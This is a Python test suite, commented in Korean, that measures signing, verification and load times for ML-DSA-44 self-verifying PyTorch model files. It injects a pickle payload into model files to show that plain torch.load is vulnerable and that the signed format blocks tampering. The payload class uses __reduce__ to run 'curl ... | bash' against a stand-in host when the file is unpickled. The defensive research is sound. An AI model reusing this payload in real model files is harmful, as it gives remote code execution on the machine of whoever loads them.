#!/usr/bin/env python3
"""
Comprehensive Model Security Test Suite
========================================
모든 크기의 모델에 대한 종합 테스트:
1. 정상 모델 생성 및 서명
2. 서명된 모델에 악성 코드 삽입
3. 각 상태별 로딩 테스트

테스트 대상:
- Small Model (~100MB)
- Medium Model (~500MB)
- Large Model (~1GB)

각 모델에 대해:
1. 정상 서명 모델 생성
2. 악성 코드 삽입
3. 로딩 및 검증 테스트
"""

import torch
import pickle
import os
import sys
import hashlib
import time
import shutil
from typing import Dict, Any

from self_verifying_secure import create_self_verifying_model, verify_self_verifying_model
from mldsa44_binding import sign as mldsa_sign


# ============================================================================
# 설정
# ============================================================================

SECRET_KEY_PATH = 'ml_dsa_secret.key'
PUBLIC_KEY_PATH = 'ml_dsa_public.key'

SOURCE_MODELS_DIR = 'models'  # 원본 모델 디렉토리
MODELS_DIR = 'models_defense'
ATTACK_DIR = 'models_attack'

# 모델 파일 경로
MODEL_FILES = {
    'small': 'small_model.pt',    # 88MB
    'medium': 'medium_model.pt',  # 2.5GB
    'large': 'large_model.pt'     # 13GB
}

# Timing 정보 저장
#
# Timing Breakdown 측정 기준:
#
# 1. Signature Generation (create_self_verifying_model):
#    - Hash: SHA-256(serialized_bytes) 시간
#    - Sign: ML-DSA-44 서명 생성 시간
#    - Write: Serialize + torch.save() 시간 (파일 저장 전체)
#    - Total: Hash + Sign + Write
#
# 2. Signature Verification (torch.load):
#    - Load: torch.load() 시간 (파일 읽기 + Deserialize, Normal 모델 기준)
#    - Hash: SHA-256(model_data_bytes) 시간 (_verify_and_restore에서 측정)
#    - Verify: ML-DSA-44 서명 검증 시간 (_verify_and_restore에서 측정)
#    - Total: Load + Hash + Verify
#
# 3. 측정 방법:
#    - Normal 모델: torch.load() = Load (검증 없음)
#    - Signed 모델: torch.load() = Load + Hash + Verify
#    - Load 시간은 Normal 모델 로드 시간을 사용 (같은 크기/구조)
#
TIMING_DATA = {
    'sign': {},  # {model_size: {hash, sign, write, total}}
    'verify': {},  # {model_size: {load, hash, verify, total}}
    'normal_load': {}  # {model_size: load_time} - Load 시간 참고값
}


# ============================================================================
# Step 1: 정상 모델 생성 및 서명
# ============================================================================

def create_and_save_models(model_size: str):
    """원본 모델을 복사하고 서명된 모델 생성"""

    print("=" * 70)
    print(f"[PREPARE] STEP 1: Preparing Models for {model_size.upper()}")
    print("=" * 70)

    # 원본 모델 파일 경로
    source_model_path = os.path.join(SOURCE_MODELS_DIR, MODEL_FILES[model_size])

    if not os.path.exists(source_model_path):
        raise FileNotFoundError(f"Source model not found: {source_model_path}")

    source_size = os.path.getsize(source_model_path)
    print(f"\n   Source model: {source_model_path}")
    print(f"   Source size: {source_size / (1024*1024):.6f} MB ({source_size:,} bytes)")

    # 원본 모델 로드 (한 번만)
    print(f"\n   Loading source model...")
    load_start = time.time()
    model = torch.load(source_model_path, weights_only=False)
    load_time = time.time() - load_start
    print(f"   ✓ Model loaded in {load_time * 1000:.2f} ms")

    # 1. 정상 모델 저장 (서명 없음, torch.save 사용)
    normal_path = os.path.join(MODELS_DIR, f'{model_size}_normal.pt')

    print(f"\n   [1/2] Saving normal model (without signature, using torch.save)...")
    save_start = time.time()
    torch.save(model, normal_path)
    save_time = time.time() - save_start
    normal_size = os.path.getsize(normal_path)
    print(f"   ✓ Normal model saved: {normal_path}")
    print(f"   ✓ Size: {normal_size / (1024*1024):.6f} MB ({normal_size:,} bytes)")
    print(f"   ✓ Save time: {save_time * 1000:.2f} ms")

    # 2. 서명된 모델 생성 (Self-Verifying)
    signed_path = os.path.join(MODELS_DIR, f'{model_size}_signed.pt')

    print(f"\n   [2/2] Creating self-verifying model with ML-DSA-44...")
    sign_start = time.time()

    result = create_self_verifying_model(
        model_path=normal_path,  # 저장된 파일 경로 전달
        secret_key_path=SECRET_KEY_PATH,
        public_key_path=PUBLIC_KEY_PATH,
        output_path=signed_path
    )

    sign_elapsed = time.time() - sign_start

    # Store timing breakdown for signature generation
    # Write = Serialize + Save (파일 저장 전체 과정)
    write_time = result['serialize_time'] + result['save_time']
    TIMING_DATA['sign'][model_size] = {
        'hash': result['hash_time'],
        'sign': result['sign_time'],
        'write': write_time,
        'total': result['total_time']
    }

    signed_size = os.path.getsize(signed_path)
    signature_overhead = signed_size - normal_size

    print(f"\n{model_size.upper()} models prepared!")
    print(f"   Normal: {normal_path}")
    print(f"      Size: {normal_size / (1024*1024):.6f} MB ({normal_size:,} bytes)")
    print(f"   Signed: {signed_path}")
    print(f"      Size: {signed_size / (1024*1024):.6f} MB ({signed_size:,} bytes)")
    print(f"      Signature overhead: {signature_overhead / 1024:.6f} KB ({signature_overhead:,} bytes)")
    print(f"      Signing time: {sign_elapsed * 1000:.2f} ms")

    return normal_path, signed_path, normal_size, signed_size


# ============================================================================
# Step 2: 악성 코드 삽입
# ============================================================================

def inject_malicious_code(normal_path: str, signed_path: str, model_size: str):
    """정상 및 서명된 모델에 악성 코드 삽입"""

    print("\n" + "=" * 70)
    print(f"[INJECT] STEP 2: Injecting Malicious Code into {model_size.upper()} Models")
    print("=" * 70)

    # 악성 페이로드 클래스 정의
    class MaliciousPayload:
        """악성 코드 실행을 위한 클래스"""
        def __reduce__(self):
            # pickle unpickling 시 os.system이 자동 실행됨
            # 원격 서버에서 악성 스크립트 다운로드 후 실행
            import os
            return (os.system, ('curl -s http://192.168.0.100:8888/attack_demo.sh | bash',))

    # ========== 1. 정상 모델에 악성 코드 삽입 ==========
    print("\n   [1/2] Creating NORMAL+MALICIOUS model...")

    # 정상 모델 로드
    normal_model = torch.load(normal_path, weights_only=False)

    # 악성 객체 추가
    if isinstance(normal_model, dict):
        normal_model['__malicious_payload__'] = MaliciousPayload()
    else:
        normal_model = {
            'original_model': normal_model,
            '__malicious_payload__': MaliciousPayload()
        }

    # 저장
    normal_malicious_path = os.path.join(ATTACK_DIR, f'{model_size}_normal_malicious.pt')

    start_time = time.time()
    torch.save(normal_model, normal_malicious_path)
    malicious_create_time = time.time() - start_time

    normal_malicious_size = os.path.getsize(normal_malicious_path)
    payload_overhead = normal_malicious_size - os.path.getsize(normal_path)
    print(f"   ✓ Saved: {normal_malicious_path}")
    print(f"      Size: {normal_malicious_size / (1024*1024):.6f} MB ({normal_malicious_size:,} bytes)")
    print(f"      Payload overhead: {payload_overhead / 1024:.6f} KB ({payload_overhead:,} bytes)")
    print(f"   [TIME] Injection time: {malicious_create_time * 1000:.2f} ms")

    # ========== 2. 서명된 모델에 악성 코드 삽입 ==========
    print("\n   [2/2] Creating SIGNED+MALICIOUS model...")

    # 서명된 파일 바이트 직접 조작
    with open(signed_path, 'rb') as f:
        signed_bytes = f.read()

    # Self-verifying model: 악성 객체 주입 (서명 검증 실패 유도)
    print(f"     Injecting malicious payload into signed model...")

    # 서명된 모델 로드 (검증 성공, SelfVerifier 객체 반환)
    print(f"   [INFO] Loading signed model (returns SelfVerifier object)...")
    verifier = torch.load(signed_path, weights_only=False)

    # model_data_bytes 추출 및 수정
    print(f"   [INFO] Extracting model_data_bytes from SelfVerifier...")
    original_model = pickle.loads(verifier.model_data_bytes)

    # 악성 객체 주입
    print(f"   [INFO] Injecting MaliciousPayload() object...")
    if isinstance(original_model, dict):
        original_model['__malicious_payload__'] = MaliciousPayload()
    else:
        original_model = {
            'original_model': original_model,
            '__malicious_payload__': MaliciousPayload()
        }

    # 변조된 데이터를 다시 직렬화
    print(f"   [INFO] Serializing modified model back to model_data_bytes...")
    verifier.model_data_bytes = pickle.dumps(original_model, protocol=4)

    print(f"   ✓ Payload injected (signature/public_key preserved, will fail verification)")

    # SelfVerifier 객체 저장 (서명/공개키는 원본 그대로!)
    signed_malicious_path = os.path.join(ATTACK_DIR, f'{model_size}_signed_malicious.pt')

    start_time = time.time()
    torch.save(verifier, signed_malicious_path, pickle_protocol=4)
    tamper_time = time.time() - start_time

    signed_malicious_size = os.path.getsize(signed_malicious_path)
    tamper_overhead = signed_malicious_size - os.path.getsize(signed_path)
    print(f"   ✓ Saved: {signed_malicious_path}")
    print(f"      Size: {signed_malicious_size / (1024*1024):.6f} MB ({signed_malicious_size:,} bytes)")
    print(f"      Tamper overhead: {tamper_overhead / 1024:.6f} KB ({tamper_overhead:,} bytes)")
    print(f"      Tampering time: {tamper_time * 1000:.2f} ms")

    print(f"\n Malicious models created!")
    print(f"   Normal+Malicious: {normal_malicious_path}")
    print(f"      Size: {normal_malicious_size / (1024*1024):.6f} MB ({normal_malicious_size:,} bytes)")
    print(f"   Signed+Malicious: {signed_malicious_path}")
    print(f"      Size: {signed_malicious_size / (1024*1024):.6f} MB ({signed_malicious_size:,} bytes)")

    return normal_malicious_path, signed_malicious_path, normal_malicious_size, signed_malicious_size


# ============================================================================
# Timing Tables
# ============================================================================

def print_timing_tables():
    """Print timing breakdown tables in LaTeX format"""

    print("\n" + "=" * 70)
    print("[PERFORMANCE] TIMING BREAKDOWN TABLES")
    print("=" * 70)

    # Table 1: Signature Generation Time Breakdown
    print("\n\\begin{table}[h]")
    print("\\centering")
    print("\\caption{Signature generation time breakdown (ms)}")
    print("\\label{tab:sign_performance}")
    print("\\footnotesize")
    print("\\setlength{\\tabcolsep}{3pt}")
    print("\\begin{tabular}{|l|r|r|r|r|}")
    print("\\hline")
    print("\\textbf{Model} & \\textbf{Hash} & \\textbf{Sign} & \\textbf{Write} & \\textbf{Total} \\\\")
    print("\\hline")

    for model in ['small', 'medium', 'large']:
        if model in TIMING_DATA['sign']:
            data = TIMING_DATA['sign'][model]
            print(f"{model.capitalize()}  & {data['hash']*1000:7.2f} & {data['sign']*1000:4.2f} & {data['write']*1000:8.2f} & {data['total']*1000:9.2f} \\\\")

    print("\\hline")
    print("\\end{tabular}")
    print("\\end{table}")

    # Table 2: Signature Verification Time Breakdown
    print("\n\\begin{table}[h]")
    print("\\centering")
    print("\\caption{Signature verification time breakdown (ms)}")
    print("\\label{tab:verify_performance}")
    print("\\footnotesize")
    print("\\setlength{\\tabcolsep}{3pt}")
    print("\\begin{tabular}{|l|r|r|r|r|}")
    print("\\hline")
    print("\\textbf{Model} & \\textbf{Load} & \\textbf{Hash} & \\textbf{Verify} & \\textbf{Total} \\\\")
    print("\\hline")

    for model in ['small', 'medium', 'large']:
        if model in TIMING_DATA['verify']:
            data = TIMING_DATA['verify'][model]
            print(f"{model.capitalize()}  & {data['load']*1000:7.2f} & {data['hash']*1000:7.2f} & {data['verify']*1000:4.2f} & {data['total']*1000:9.2f} \\\\")

    print("\\hline")
    print("\\end{tabular}")
    print("\\end{table}")

    print("\n" + "=" * 70)


# ============================================================================
# Step 3: 로딩 테스트
# ============================================================================

def test_loading(model_path: str, model_type: str, expected_result: str, model_size: str = None):
    """모델 로딩 테스트

    Args:
        model_path: 모델 파일 경로
        model_type: 'signed' or 'malicious'
        expected_result: 'success', 'fail', 'attack_demo'
        model_size: 모델 크기 ('small', 'medium', 'large') - timing 정보 저장용
    """

    print(f"\n   Testing {model_type} model...")
    print(f"   File: {model_path}")
    print(f"   Expected: {expected_result.upper()}")
    print()

    start_time = time.time()

    try:
        # 정상 모델 로딩 (torch.load)
        if model_type == 'normal':
            print(f"   Loading with torch.load()...")
            result = torch.load(model_path, weights_only=False)
            elapsed = time.time() - start_time

            # Store normal load time for Read/Deserialize estimation
            if model_size:
                TIMING_DATA['normal_load'][model_size] = elapsed

            if expected_result == 'success':
                print(f"   [PASS] Normal model loaded successfully")
                print(f"   [TIME] Load time: {elapsed * 1000:.2f} ms")
                print(f"   Model type: {type(result)}")
                return True
            else:
                print(f"   [FAIL] Model loaded but should have failed!")
                return False

        # 서명된 모델 로딩 (Self-Verifying: torch.load() 자동 검증!)
        elif model_type == 'signed':
            print(f"   Loading with torch.load() - AUTOMATIC VERIFICATION")
            print(f"   [INFO] __reduce__() hook will auto-verify signature")

            load_start = time.time()
            result = torch.load(model_path, weights_only=False)
            total_time = time.time() - load_start

            # Extract timing info from SelfVerifier
            if hasattr(result, '_timing') and model_size:
                timing_info = result._timing
                hash_time = timing_info['hash_time']
                verify_time = timing_info['verify_time']

                # Load 시간은 Normal 모델 로드 시간 사용 (같은 크기/구조)
                # Normal 로드: torch.load() = Load (Read + Deserialize)
                # Signed 로드: torch.load() = Load + Hash + Verify
                if model_size in TIMING_DATA['normal_load']:
                    load_time = TIMING_DATA['normal_load'][model_size]
                else:
                    # 기본값: Total - Hash - Verify
                    load_time = total_time - hash_time - verify_time

                TIMING_DATA['verify'][model_size] = {
                    'load': load_time,
                    'hash': hash_time,
                    'verify': verify_time,
                    'total': total_time
                }

            if expected_result == 'success':
                print(f"   [PASS] Model loaded successfully (signature auto-verified)")
                print(f"   [TIME] Auto-verification + Load time: {total_time * 1000:.2f} ms")
                print(f"   Model type: {type(result)}")
                return True
            else:
                print(f"   [FAIL] Model loaded but should have failed!")
                return False

        # 악성 모델 로딩 (torch.load - 위험!)
        else:
            print(f"   [WARNING] Loading with torch.load() (VULNERABLE!)")
            print(f"   [WARNING] Malicious code WILL execute during unpickling...")
            print(f"   {'─'*66}")

            # torch.load()는 자동으로 __reduce__() 호출 → 악성 코드 실행
            result = torch.load(model_path, weights_only=False)
            elapsed = time.time() - start_time

            print(f"   {'─'*66}")
            print(f"   [DANGER] ATTACK EXECUTED!")
            print(f"   [DANGER] Malicious payload was triggered during unpickling")
            print(f"   [DANGER] Remote script downloaded: curl http://192.168.0.100:8888/attack_demo.sh")
            print(f"   [TIME] Attack execution time: {elapsed * 1000:.2f} ms")

            if expected_result == 'attack_demo':
                print(f"\n   [WARNING] DEMONSTRATION: Attack succeeded (torch.load is vulnerable)")
                return True
            else:
                print(f"\n   [CRITICAL] Attack executed (should have been blocked!)")
                return False

    except ValueError as e:
        elapsed = time.time() - start_time
        error_msg = str(e)

        if expected_result == 'fail':
            print(f"   [BLOCK] Model rejected by security mechanism")
            print(f"   [BLOCK] Error: {error_msg[:100]}...")
            print(f"   [TIME] Detection time: {elapsed * 1000:.2f} ms")
            return True
        else:
            print(f"   [FAIL] Model rejected but should have loaded!")
            print(f"   [FAIL] Error: {error_msg[:100]}...")
            return False

    except Exception as e:
        elapsed = time.time() - start_time
        error_msg = str(e)

        # 악성 모델 로딩 시도에서 에러 발생
        if model_type == 'malicious' and expected_result == 'attack_demo':
            # 공격 코드는 실행되었지만 모델 로딩은 실패
            print(f"   {'─'*66}")
            print(f"   [DANGER] ATTACK PARTIALLY EXECUTED!")
            print(f"   [DANGER] Malicious __reduce__() was called (curl executed)")
            print(f"   [DANGER] Error after attack: {error_msg[:80]}...")
            print(f"   [TIME] Time: {elapsed * 1000:.2f} ms")
            print(f"\n   [WARNING] DEMONSTRATION: Attack triggered despite model load failure")
            return True

        # 서명 검증 실패 또는 파일 구조 손상으로 인한 차단
        block_keywords = [
            'signature', 'tamper', 'magic',  # 서명 관련
            'truncated', 'invalid', 'corrupted',  # 파일 손상
            'cannot fit', 'struct.error',  # 구조 파싱 에러
            'hash', 'verification'  # 검증 관련
        ]

        is_blocked = any(keyword in error_msg.lower() for keyword in block_keywords)

        if is_blocked and expected_result == 'fail':
            print(f"   [BLOCK] Security mechanism detected tampering")
            print(f"   [BLOCK] Error type: {error_msg[:100]}...")
            print(f"   [TIME] Detection time: {elapsed * 1000:.2f} ms")
            return True

        # 기타 에러
        print(f"   [ERROR] Unexpected error: {error_msg[:100]}...")
        print(f"   [ERROR] This error was not recognized as a security block")
        return False


def test_model_suite(model_size: str):
    """특정 크기 모델에 대한 전체 테스트 수행"""

    print("\n" + "=" * 70)
    print(f"[TEST] STEP 3: Loading Tests for {model_size.upper()} Model")
    print("=" * 70)

    normal_path = os.path.join(MODELS_DIR, f'{model_size}_normal.pt')
    normal_malicious_path = os.path.join(ATTACK_DIR, f'{model_size}_normal_malicious.pt')
    signed_path = os.path.join(MODELS_DIR, f'{model_size}_signed.pt')
    signed_malicious_path = os.path.join(ATTACK_DIR, f'{model_size}_signed_malicious.pt')

    results = []

    # Test 1: 정상 모델 로딩 (torch.load)
    print("\n[Test 1/4] Loading NORMAL model with torch.load (should succeed)...")
    result1 = test_loading(normal_path, 'normal', 'success', model_size)
    results.append(('Normal model - torch.load', result1))

    # Test 2: 정상 모델 + 악성 스크립트 (torch.load) - 공격 실행
    print("\n[Test 2/4] Loading NORMAL+MALICIOUS model with torch.load [ATTACK]...")
    result2 = test_loading(normal_malicious_path, 'malicious', 'attack_demo', model_size)
    results.append(('Normal+Malicious - torch.load (attack)', result2))

    # Test 3: 서명된 모델 로딩 (SecureSignedModel)
    print("\n[Test 3/4] Loading SIGNED model with SecureSignedModel (should succeed)...")
    result3 = test_loading(signed_path, 'signed', 'success', model_size)
    results.append(('Signed model - SecureSignedModel', result3))

    # Test 4: 서명된 모델 + 악성 스크립트 시도 (SecureSignedModel) - 차단
    print("\n[Test 4/4] Attempting SIGNED+MALICIOUS with SecureSignedModel [BLOCKED]...")
    result4 = test_loading(signed_malicious_path, 'signed', 'fail', model_size)
    results.append(('Signed+Malicious - SecureSignedModel (blocked)', result4))

    return results


# ============================================================================
# 메인 테스트 실행
# ============================================================================

def main():
    """전체 테스트 실행"""

    print("=" * 70)
    print("[SECURITY] COMPREHENSIVE MODEL SECURITY TEST SUITE")
    print("=" * 70)
    print("\nTesting 3 model sizes: Small, Medium, Large")
    print("Each model will go through:")
    print("  1. Create normal & signed models")
    print("  2. Inject malicious code into both")
    print("  3. Test 4 scenarios:")
    print("     - Normal model (torch.load)")
    print("     - Normal+Malicious (torch.load) - ATTACK")
    print("     - Signed model (SecureSignedModel)")
    print("     - Signed+Malicious (SecureSignedModel) - BLOCKED")
    print("=" * 70)

    # 디렉토리 생성
    os.makedirs(MODELS_DIR, exist_ok=True)
    os.makedirs(ATTACK_DIR, exist_ok=True)

    all_results = {}
    file_sizes = {}

    for model_size in ['small', 'medium', 'large']:
        print("\n\n" + "=" * 70)
        print(f"[TARGET] TESTING {model_size.upper()} MODEL")
        print("=" * 70)

        try:
            # Step 1: 정상 & 서명 모델 생성
            normal_path, signed_path, normal_size, signed_size = create_and_save_models(model_size)

            # Step 2: 악성 코드 삽입
            normal_mal_path, signed_mal_path, normal_mal_size, signed_mal_size = inject_malicious_code(
                normal_path, signed_path, model_size
            )

            # 파일 크기 저장
            file_sizes[model_size] = {
                'normal': normal_size,
                'signed': signed_size,
                'normal_malicious': normal_mal_size,
                'signed_malicious': signed_mal_size
            }

            # Step 3: 로딩 테스트
            results = test_model_suite(model_size)

            all_results[model_size] = results

        except Exception as e:
            print(f"\n[ERROR] Error during {model_size} model test: {e}")
            import traceback
            traceback.print_exc()
            all_results[model_size] = [('Error', False)]

    # 최종 결과 요약
    print("\n\n" + "=" * 70)
    print("[SUMMARY] FINAL TEST SUMMARY")
    print("=" * 70)

    total_tests = 0
    passed_tests = 0
    blocked_count = 0
    attack_demo_count = 0

    for model_size in ['small', 'medium', 'large']:
        print(f"\n{model_size.upper()} Model:")
        if model_size in all_results:
            for test_name, result in all_results[model_size]:
                total_tests += 1
                if result:
                    passed_tests += 1
                    # 차단 성공 vs 공격 데모 구분
                    if 'blocked' in test_name.lower():
                        status = "[BLOCK]"
                        blocked_count += 1
                    elif 'attack' in test_name.lower():
                        status = "[DANGER]"
                        attack_demo_count += 1
                    else:
                        status = "[PASS]"
                else:
                    status = "[FAIL]"
                print(f"  {status}: {test_name}")
        else:
            print("  [WARNING] Tests not run")

    print("\n" + "=" * 70)
    print(f"Total: {passed_tests}/{total_tests} tests passed ({passed_tests*100//total_tests if total_tests > 0 else 0}%)")
    print("=" * 70)

    if passed_tests == total_tests:
        print("\n[SUCCESS] ALL TESTS COMPLETED SUCCESSFULLY!")
        print(f"\n[SECURITY] Security Results:")
        print(f"  [BLOCK] Secure loading (blocked): {blocked_count}/{blocked_count}")
        print(f"  [DANGER] Attack demonstrations: {attack_demo_count}/{attack_demo_count}")
        print(f"\n[WARNING] Key Finding: torch.load() is VULNERABLE to pickle attacks!")
        print(f"[SUCCESS] SecureSignedModel successfully blocks all malicious models!")
    else:
        print(f"\n[FAIL] {total_tests - passed_tests} tests failed!")

    # 파일 크기 요약
    print("\n\n" + "=" * 70)
    print("[INFO] FILE SIZE SUMMARY")
    print("=" * 70)

    for model_size in ['small', 'medium', 'large']:
        if model_size in file_sizes:
            sizes = file_sizes[model_size]
            normal = sizes['normal']
            normal_mal = sizes['normal_malicious']
            signed = sizes['signed']
            signed_mal = sizes['signed_malicious']

            print(f"\n{model_size.upper()} Model:")
            print(f"  1. Normal model:          {normal / (1024*1024):>12.6f} MB  ({normal:>15,} bytes)")
            print(f"  2. Normal + Malicious:    {normal_mal / (1024*1024):>12.6f} MB  ({normal_mal:>15,} bytes)")
            print(f"     Payload overhead:      {(normal_mal - normal) / 1024:>12.6f} KB  ({normal_mal - normal:>15,} bytes)")
            print(f"  3. Signed model:          {signed / (1024*1024):>12.6f} MB  ({signed:>15,} bytes)")
            print(f"     Signature overhead:    {(signed - normal) / 1024:>12.6f} KB  ({signed - normal:>15,} bytes)")
            print(f"  4. Signed + Tampered:     {signed_mal / (1024*1024):>12.6f} MB  ({signed_mal:>15,} bytes)")
            print(f"     Tamper overhead:       {(signed_mal - signed) / 1024:>12.6f} KB  ({signed_mal - signed:>15,} bytes)")

    print("\n" + "=" * 70)

    # Print timing breakdown tables
    print_timing_tables()

    return passed_tests == total_tests


if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)
